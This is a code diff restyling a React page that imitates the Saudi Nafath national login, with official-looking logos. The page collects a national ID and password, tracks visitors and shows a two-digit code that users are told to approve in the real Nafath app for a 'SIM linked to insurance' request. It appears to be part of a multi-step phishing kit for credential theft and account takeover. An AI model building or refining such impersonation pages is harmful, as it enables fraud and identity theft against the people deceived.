@@ -1,9 +1,8 @@
 "use client";
 
-import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
+import { Loader2Icon, ShieldAlert, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Card, CardContent } from "@/components/ui/card";
 import {
   Dialog,
   DialogContent,
@@ -16,6 +15,7 @@ import { Alert } from "@/components/ui/alert";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { updateVisitorPage } from "@/lib/visitor-tracking";
+import { StepShell } from "@/components/step-shell";
 
 export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
@@ -197,267 +197,147 @@ export default function Component() {
   // Confirmation code will be displayed as two individual digits
 
   return (
-    <div
-      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
-      dir="rtl"
-    >
-      {/* Header */}
-      <header className="bg-white shadow-sm border-b">
-        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
-          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
-          <img src="/nafad-logo.png" alt="نفاذ" width={120} className="object-contain" />
-          <div className="w-6"></div>
-        </div>
-      </header>
-
-      {/* Main Content */}
-      <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
-        {/* Login Section Title */}
-        <div className="text-center space-y-2">
-          <h1 className="text-2xl font-bold text-gray-800 mb-2">
-            الدخول على النظام
-          </h1>
-          <p className="text-gray-600 text-sm">
-            استخدم تطبيق نفاذ للدخول بشكل آمن
-          </p>
-        </div>
-
-        {/* Nafath App Section */}
-        <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
-          <div className="flex items-center justify-center gap-2 mb-2">
-            <ShieldAlert className="w-6 h-6" />
-            <h2 className="text-xl font-bold">تطبيق نفاذ</h2>
+    <>
+      <StepShell
+        step={8}
+        title="التحقق عبر نفاذ"
+        subtitle="استخدم بياناتك للتحقق الآمن ثم تابع الموافقة داخل تطبيق نفاذ."
+        icon={<ShieldAlert className="h-8 w-8" />}
+      >
+        <form onSubmit={handleLogin} className="space-y-4">
+          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4 text-sm text-[#24577a]">
+            <p className="font-semibold">رقم بطاقة الأحوال/الإقامة</p>
+            <p className="mt-1 text-xs text-[#638094]">أدخل رقم الهوية الخاص بك للمتابعة وإتمام التحقق.</p>
           </div>
-          <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
-        </div>
 
-        <form onSubmit={handleLogin}>
-          {/* Login Form */}
-          <Card className="bg-white shadow-lg border-0">
-            <CardContent className="p-6 space-y-5">
-              <div className="text-center">
-                <p className="text-gray-700 font-semibold mb-1">
-                  رقم بطاقة الأحوال/الإقامة
-                </p>
-                <p className="text-sm text-gray-500">
-                  أدخل رقم الهوية الخاص بك للمتابعة
-                </p>
-              </div>
+          <div className="space-y-2">
+            <Input
+              placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
+              className={`h-12 rounded-xl border-2 px-4 text-right text-base ${
+                idError ? "border-red-500" : "border-[#d2e1ed] focus:border-[#145072]"
+              }`}
+              dir="ltr"
+              value={idLogin}
+              onChange={(e) => {
+                const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10)
+                setLoginID(value)
+                if (value.length === 10) {
+                  validateSaudiId(value)
+                } else if (value.length > 0) {
+                  setIdError("رقم الهوية يجب أن يكون 10 أرقام")
+                } else {
+                  setIdError("")
+                }
+              }}
+              required
+            />
+            {idError && (
+              <p className="text-right text-sm font-semibold text-red-600">{idError}</p>
+            )}
+          </div>
 
-              <div className="space-y-2">
-                <Input
-                  placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
-                  className={`text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all ${idError ? 'border-red-500' : ''}`}
-                  dir="rtl"
-                  value={idLogin}
-                  onChange={(e) => {
-                    const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10)
-                    setLoginID(value)
-                    if (value.length === 10) {
-                      validateSaudiId(value)
-                    } else if (value.length > 0) {
-                      setIdError("رقم الهوية يجب أن يكون 10 أرقام")
-                    } else {
-                      setIdError("")
-                    }
-                  }}
-                  required
-                />
-                {idError && (
-                  <p className="text-sm text-red-600 text-right">{idError}</p>
-                )}
-              </div>
-              <Input
-                placeholder="أدخل كلمة المرور الخاصة بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
-                dir="rtl"
-                onChange={(e) => setPassword(e.target.value)}
-                type="password"
-                required
-              />
-              {showError && (
-                <Alert
-                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
-                  dir="rtl"
-                >
-                  <ShieldAlert className="w-5 h-5 text-red-600" />
-                  {showError}
-                </Alert>
-              )}
+          <Input
+            placeholder="أدخل كلمة المرور الخاصة بك هنا"
+            className="h-12 rounded-xl border-2 border-[#d2e1ed] px-4 text-right text-base focus:border-[#145072]"
+            dir="rtl"
+            onChange={(e) => setPassword(e.target.value)}
+            type="password"
+            required
+          />
 
-              <Button
-                type="submit"
-                disabled={isloading || !idLogin}
-                className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all disabled:opacity-50"
-              >
-                {isloading ? (
-                  <>
-                    <Loader2Icon className="animate-spin ml-2" />
-                    جاري التحقق...
-                  </>
-                ) : (
-                  "تسجيل الدخول"
-                )}
-              </Button>
+          {showError && (
+            <Alert className="flex items-center gap-2 border-red-200 bg-red-50 text-sm text-red-700" dir="rtl">
+              <ShieldAlert className="h-5 w-5 text-red-600" />
+              {showError}
+            </Alert>
+          )}
 
-              <div className="pt-4 border-t">
-                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
-                  لتحميل تطبيق نفاذ
-                </div>
+          <Button
+            type="submit"
+            disabled={isloading || !idLogin}
+            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429] disabled:opacity-60"
+          >
+            {isloading ? (
+              <>
+                <Loader2Icon className="ml-2 h-5 w-5 animate-spin" />
+                جاري التحقق...
+              </>
+            ) : (
+              "تسجيل الدخول"
+            )}
+          </Button>
 
-                {/* App Store Buttons */}
-                <div className="flex justify-center gap-3">
-                  <a href="#" className="hover:scale-105 transition-transform">
-                    <img src="/google-play.png" alt="Google Play" className="h-10" />
-                  </a>
-                  <a href="#" className="hover:scale-105 transition-transform">
-                    <img src="/apple_store.png" alt="App Store" className="h-10" />
-                  </a>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
+          <div className="rounded-xl border border-[#e2ecf5] bg-[#fbfdff] p-4">
+            <p className="mb-3 text-center text-sm font-semibold text-[#45667d]">تحميل تطبيق نفاذ</p>
+            <div className="flex justify-center gap-3">
+              <a href="#" className="transition-transform hover:scale-105">
+                <img src="/google-play.png" alt="Google Play" className="h-10" />
+              </a>
+              <a href="#" className="transition-transform hover:scale-105">
+                <img src="/apple_store.png" alt="App Store" className="h-10" />
+              </a>
+            </div>
+          </div>
         </form>
+      </StepShell>
 
-        {/* New Nafath Platform Section */}
-        <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
-          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
-          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
-          <CardContent className="p-8 text-center space-y-4 relative z-10">
-            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
-              <Smartphone className="w-8 h-8 text-white" />
-            </div>
-            <h2 className="text-2xl font-bold">منصة النفاذ الجديدة</h2>
-            <p className="text-sm leading-relaxed text-teal-50">
-              لتجربة أكثر سهولة استخدم النسخة المحدثة
+      <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
+        <DialogContent className="mx-auto max-w-md border-[#dbe6ef] [&>button]:hidden" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="mb-2 text-center text-2xl font-bold text-[#145072]">
+              رمز التحقق
+            </DialogTitle>
+            <p className="px-4 text-center text-base font-semibold leading-relaxed text-[#2f4f64]">
+              سيتم إصدار أمر ربط شريحة بوثيقة التأمين الخاصة بك
               <br />
-              من منصة النفاذ الوطني الموحد
+              الرجاء الدخول إلى تطبيق نفاذ وتأكيد الرقم أدناه
             </p>
-            <Button className="bg-white text-teal-700 hover:bg-teal-50 px-8 py-3 rounded-lg font-bold shadow-lg hover:shadow-xl transition-all mt-4">
-              ابدأ الآن
+          </DialogHeader>
+
+          <div className="space-y-6 p-4 text-center">
+            <div className="mx-auto flex h-44 w-44 items-center justify-center rounded-2xl border-2 border-[#d4e6f5] bg-[#f4fafe] shadow-sm">
+              <div className="flex items-center justify-center gap-3 text-6xl font-bold text-[#145072] font-mono" dir="ltr">
+                <div>{confirmationCode?.[0] || "-"}</div>
+                <div>{confirmationCode?.[1] || "-"}</div>
+              </div>
+            </div>
+
+            <div className="flex items-center justify-center gap-3 py-2 text-[#145072]">
+              <div className="relative">
+                <div className="absolute h-3 w-3 animate-ping rounded-full bg-[#145072]"></div>
+                <div className="h-3 w-3 rounded-full bg-[#145072]"></div>
+              </div>
+              <div className="text-sm font-medium">في انتظار الموافقة...</div>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <DialogContent className="mx-auto max-w-md border-[#dbe6ef]" dir="rtl">
+          <div className="space-y-6 p-4 text-center">
+            <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
+              <CheckCircle2 className="h-12 w-12 text-green-600" />
+            </div>
+
+            <div className="space-y-2">
+              <h3 className="text-2xl font-bold text-[#1d4e68]">تم التحقق بنجاح!</h3>
+              <p className="text-[#5f788b]">تمت عملية التحقق من هويتك بنجاح عبر نفاذ</p>
+            </div>
+
+            <div className="rounded-lg border-2 border-green-200 bg-green-50 p-4">
+              <p className="text-sm font-medium text-green-800">شكراً لاستخدامك منصة النفاذ الوطني الموحد</p>
+            </div>
+
+            <Button
+              onClick={() => setShowSuccessDialog(false)}
+              className="h-12 w-full rounded-xl bg-[#145072] text-lg font-semibold text-white transition-all hover:bg-[#0f405b]"
+            >
+              إغلاق
             </Button>
-          </CardContent>
-        </Card>
-
-        {/* Confirmation Code Display Dialog - UPDATED WITH TWO SEPARATE CODES */}
-        <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
-          <DialogContent className="max-w-md mx-auto [&>button]:hidden" dir="rtl">
-            <DialogHeader>
-              <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
-                رمز التحقق
-              </DialogTitle>
-              <p className="text-center text-lg text-gray-800 leading-relaxed font-semibold px-4">
-                سيتم إصدار أمر ربط شريحة بوثيقة التأمين الخاصة بك<br />
-                الرجاء الدخول إلى تطبيق نفاذ وتأكيد الرقم أدناه
-              </p>
-            </DialogHeader>
-
-            <div className="text-center space-y-6 p-4">
-              {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
-              <div className="mx-auto w-48 h-48 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-2xl shadow-lg flex items-center justify-center">
-                <div className="flex gap-3 justify-center items-center" dir="ltr">
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
-                    {confirmationCode?.[0] || "-"}
-                  </div>
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
-                    {confirmationCode?.[1] || "-"}
-                  </div>
-                </div>
-              </div>
-
-              <div className="flex items-center justify-center gap-3 text-teal-600 py-2">
-                <div className="relative">
-                  <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
-                  <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
-                </div>
-                <div className="text-sm font-medium">في انتظار الموافقة...</div>
-              </div>
-            </div>
-          </DialogContent>
-        </Dialog>
-
-        {/* Success Dialog */}
-        <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-          <DialogContent className="max-w-md mx-auto" dir="rtl">
-            <div className="text-center space-y-6 p-4">
-              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
-                <CheckCircle2 className="w-12 h-12 text-green-600" />
-              </div>
-
-              <div className="space-y-2">
-                <h3 className="text-2xl font-bold text-gray-800">
-                  تم التحقق بنجاح!
-                </h3>
-                <p className="text-gray-600">
-                  تمت عملية التحقق من هويتك بنجاح عبر نفاذ
-                </p>
-              </div>
-
-              <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
-                <p className="text-sm text-green-800 font-medium">
-                  شكراً لاستخدامك منصة النفاذ الوطني الموحد
-                </p>
-              </div>
-
-              <Button
-                onClick={() => setShowSuccessDialog(false)}
-                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all"
-              >
-                إغلاق
-              </Button>
-            </div>
-          </DialogContent>
-        </Dialog>
-      </main>
-
-      {/* Footer */}
-      <footer className="mt-12 p-6 bg-white border-t">
-        <div className="text-center space-y-6 max-w-4xl mx-auto">
-          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الرئيسية
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              حول
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              اتصل بنا
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الشروط والأحكام
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              المساعدة والدعم
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              سياسة الخصوصية
-            </a>
           </div>
-
-          {/* Government Verification Badge */}
-          <div className="flex justify-center mt-4">
-            <img src="/cst-logo.jpg" alt="هيئة الاتصالات" width={60} className="opacity-80 rounded" />
-          </div>
-        </div>
-      </footer>
-    </div>
+        </DialogContent>
+      </Dialog>
+    </>
   );
 }
